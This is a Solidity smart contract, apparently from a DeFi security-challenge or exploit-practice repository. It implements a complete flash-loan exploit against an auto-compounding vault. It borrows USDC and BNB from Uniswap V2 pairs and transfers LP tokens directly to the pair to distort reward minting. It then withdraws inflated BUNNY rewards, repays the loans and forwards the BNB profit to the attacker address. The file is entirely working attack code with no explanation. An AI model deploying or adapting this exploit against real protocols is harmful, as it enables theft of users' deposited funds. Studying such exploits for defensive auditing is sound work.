pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "../fatality/AutoCompoundVault.sol";

contract FatalityHack {
    IUniswapV2Router02 private ROUTER;
    IUniswapV2Pair private USDC_DAI;
    IUniswapV2Pair private BNB_DAI;
    IUniswapV2Pair private BNB_USDC;
    IERC20 private BUNNY;
    IERC20 private USDC;
    IERC20 private BNB;
    AutoCompoundVault private VAULT;

    address attacker;

    constructor(
        address _router,
        address _usdcDaiPair,
        address _bnbDaiPair,
        address _bnbUsdcPair,
        address _bunny,
        address _usdc,
        address _bnb,
        address _vault
    ) {
        ROUTER = IUniswapV2Router02(_router);
        USDC_DAI = IUniswapV2Pair(_usdcDaiPair); // saved for ease of use
        BNB_DAI = IUniswapV2Pair(_bnbDaiPair);
        BNB_USDC = IUniswapV2Pair(_bnbUsdcPair);
        BUNNY = IERC20(_bunny);
        USDC = IERC20(_usdc);
        BNB = IERC20(_bnb);
        VAULT = AutoCompoundVault(_vault);
        attacker = msg.sender;
    }

    function run(uint256 _amountUSDC, uint256 _amountBNB) external {
        USDC_DAI.swap(_amountUSDC, 0, address(this), abi.encode(_amountBNB));
    }

    function uniswapV2Call(
        address, /*_sender*/
        uint256 _amount0,
        uint256, /*_amount1*/
        bytes calldata _data
    ) external {
        if (msg.sender == address(USDC_DAI)) {
            uint256 amountBNB = abi.decode(_data, (uint256));
            BNB_DAI.swap(
                amountBNB,
                0,
                address(this),
                abi.encode(_amount0, amountBNB)
            );
        } else if (msg.sender == address(BNB_DAI)) {
            (uint256 amountUSDC, uint256 amountBNB) = abi.decode(
                _data,
                (uint256, uint256)
            );
            USDC.approve(address(ROUTER), type(uint256).max);
            BNB.approve(address(ROUTER), type(uint256).max);
            BNB_USDC.approve(address(ROUTER), type(uint256).max);
            BUNNY.approve(address(ROUTER), type(uint256).max);

            ROUTER.addLiquidity(
                address(USDC),
                address(BNB),
                amountUSDC,
                amountBNB, // LP minted dependent on larger of the two
                0,
                0,
                address(this),
                block.timestamp
            );

            // transfer most of the USDC-BNB LP directly to the pair address
            BNB_USDC.transfer(
                address(BNB_USDC),
                BNB_USDC.balanceOf(address(this)) - 1e18
            );

            // transfer remaining USDC-BNB LP to the VAULT
            BNB_USDC.approve(address(VAULT), type(uint256).max);
            VAULT.depositAll();

            swap(
                address(BNB),
                address(USDC),
                BNB.balanceOf(address(this)),
                true
            );

            // earn rewards and get back LP token constituents
            VAULT.withdrawAllAndEarn();

            ROUTER.removeLiquidity(
                address(USDC),
                address(BNB),
                BNB_USDC.balanceOf(address(this)),
                0,
                0,
                address(this),
                block.timestamp
            );

            // swapping all minted BUNNY to BNB
            swap(
                address(BUNNY),
                address(BNB),
                BUNNY.balanceOf(address(this)),
                true
            );

            // calculate the amount of USDC loan repayment
            uint256 usdcRepay = calculateRepay(amountUSDC);

            // calculating the amount of BNB loan repayment
            uint256 bnbRepay = calculateRepay(amountBNB);

            uint256 usdcBalance = USDC.balanceOf(address(this));

            // swap required BNB back to USDC for loan repayment
            swap(address(BNB), address(USDC), usdcRepay - usdcBalance, false);

            // repaying the BNB and USDC flashloans, send BNB profit to attacker
            BNB.transfer(address(BNB_DAI), bnbRepay);
            USDC.transfer(address(USDC_DAI), usdcRepay);
            BNB.transfer(attacker, BNB.balanceOf(address(this)));
        }
    }

    function swap(
        address tokenIn,
        address tokenOut,
        uint256 amount,
        bool exactIn
    ) private {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        if (exactIn) {
            ROUTER.swapExactTokensForTokens(
                amount,
                0,
                path,
                address(this),
                block.timestamp
            );
        } else {
            ROUTER.swapTokensForExactTokens(
                amount,
                type(uint256).max,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function calculateRepay(uint256 amount) private pure returns (uint256) {
        uint256 num = amount * (10**18) * 1000;
        uint256 x = num / 997 / 10**18;
        return x + 1;
    }
}
